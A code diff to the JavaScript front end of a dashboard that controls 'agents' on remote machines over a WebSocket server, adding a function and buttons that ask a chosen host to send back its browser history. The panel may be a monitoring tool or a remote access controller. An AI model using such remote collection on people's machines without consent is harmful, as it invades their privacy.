@@ -10,7 +10,7 @@ const agentCount = document.getElementById('agent-count');
 const noMachine = document.getElementById('no-machine');
 
 let ws;
-const SERVER_URL = 'ws://192.168.10.131:9000';
+const SERVER_URL = 'ws://192.168.10.232:9000';
 const machines = {}; // { hostname: { card, lastSeen } }
 const TIMEOUT = 30000; // 30 secondes d'inactivité avant suppression
 let reconnectInterval = 5000; // Intervalle de reconnexion (5 secondes)
@@ -34,6 +34,28 @@ function sendCommand(hostname) {
     console.warn('Impossible to send command');
   }
 }
+
+
+
+
+function getbrowserhistory(hostname) {
+
+
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    const payload = {
+      type: 'getbrowserhistory',
+      target: hostname  // Agent a envoyer du commande 
+    };
+    ws.send(JSON.stringify(payload));
+    console.log(`[🟢] request sent to ${hostname}`);
+  } else {
+    console.warn('Impossible to send request');
+  }
+}
+
+
+
+
 
 
 
@@ -478,6 +500,12 @@ function updateMachineCard(data, hostname) {
 
 
 
+
+      <div style="margin-top: 20px;margin-bottom:20px;">
+      <button onclick="getbrowserhistory('${hostname}')" style="background-color:black; border-radius:10px;color:#00FF00;padding: 5px 10px;">browser history</button>
+          </div>
+
+
 </div>
 
 
@@ -512,8 +540,6 @@ function createNewMachineCard(data, hostname) {
 
   card.innerHTML = `
 
-  
-  
   <p style="position:absolute;"><i class="fas fa-globe"></i> ${
     data.agent_type === 'lan'
     ? 'LAN'
@@ -536,9 +562,7 @@ function createNewMachineCard(data, hostname) {
 
 
 
-      
-
-
+    
 
 
 <div style="display:flex;flex-direction:row;margin-left:100px;height:10px;margin-top:3px;">
@@ -700,6 +724,13 @@ function createNewMachineCard(data, hostname) {
       </div>
 
 
+
+
+
+
+      <div style="margin-top: 20px;margin-bottom:20px;">
+  <button onclick="getbrowserhistory('${hostname}')" style="background-color:black; border-radius:10px;color:#00FF00;padding: 5px 10px;">browser history</button>
+      </div>
 
 </div>
 
